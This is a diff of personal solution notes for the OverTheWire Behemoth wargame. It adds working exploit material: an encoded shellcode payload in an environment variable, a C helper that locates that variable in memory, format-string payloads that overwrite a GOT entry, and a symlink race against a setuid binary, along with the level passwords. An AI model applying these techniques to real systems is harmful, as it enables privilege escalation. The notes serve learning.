@@ -345,7 +345,7 @@ export SHELLCODE=$(perl -e 'print "\x90"x20 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\
 (perl -e 'print "\x90"x71 . "\xb1\xd5\xff\xff"';cat) | ./behemoth1
 
 password: IxPJbQtH8q
-04
+
 ###############################################################################
 
 Level 2:
@@ -378,24 +378,68 @@ $ objdump -d behemoth3          // static disassembly of ELF
 $ objdump -R behemoth3          // Gets relocatable entries (libs)
     0804b218  puts@GLIBC_2.0    // puts() GOT entry is stored at 0x0804b128
 
-* we want to overwrite 0x0804b128 -> shellcode address
-
-Shellcode = 
-\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8
-\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30
-\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81
+* we want to overwrite 0x0804b218 -> shellcode address
 
 export SHELLCODE=$(perl -e 'print "\x90"x20 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
 
-environment variable location:  0xffffd57a
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+	char *ptr;
+
+	if(argc < 3) {
+		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
+		exit(0);
+	}
+	ptr = getenv(argv[1]); /* get env var location */
+	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
+	printf("%s will be at %p\n", argv[1], ptr);
+}
+
+environment variable location:  0xffffd58b
 puts GOT entry:                 0x0804b218
 
-perl -e 'print "AAAA\x18\xb2\x04\x08" . "%54634x%n"'
-Should place 0x0000d57a into puts GOT entry ---- Confirmed
+* Creating the Format string
+perl -e 'print "AAAA\x18\xb2\x04\x08" . "%131x%n"'
+              8 + 131 = 139 = 0x8b
+perl -e 'print "AAAA\x18\xb2\x04\x08AAAA\x19\xb2\x04\x08" . "%123x%n%90x%n"'
+          8 + 8 + 123 = 139 + 74 = 213 = 0xd5
+perl -e 'print "AAAA\x18\xb2\x04\x08AAAA\x19\xb2\x04\x08AAAA\x1a\xb2\x04\x08" . "%115x%n%74x%n%42x%n"'            
+      8 + 8 + 8 + 115 = 139 + 74 = 213 + 42 = 255 = 0xff
+perl -e 'print "AAAA\x18\xb2\x04\x08AAAA\x19\xb2\x04\x08AAAA\x1a\xb2\x04\x08AAAA\x1b\xb2\x04\x08" . "%107x%n%74x%n%42x%n%256x%n"'
+  8 + 8 + 8 + 8 + 107 = 139 + 74 = 213 + 42 = 255 + 256 = 0x1ff
 
-perl -e 'print "AAAA\x18\xb2\x04\x08" . "AAAA\x1a\xb2\x04\x08" . "%54634x%n%10893x%n"'
+password = hpjUdlG723
 
-perl -e 'print "AAAA\x18\xb2\x04\x08" . "AAAA\x1a\xb2\x04\x08" . "%x%x%54632x%n%10893x%n"'
+###############################################################################
+
+Level 4
+Exploit: Symbolic Link, Pausing Processes
+
+* The proc gets its own PID and then attempts to open and read a file /tmp/$PID.
+  Because setuid, we can symbolic link /tmp/$PID to behemoth5 password file. 
+  When running the process, get the PID and then immediately pause it. create the file
+  and then continue with execution so that the program writes the password
+
+/behemoth4& PID=$!; kill -STOP $PID; ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID; kill -CONT $PID
+
+password = mVfC4rBKZ4
+
+###############################################################################
+
+Level 5
+Exploit: 
+
+
+
+
+
+
+
+
+
 
 
 
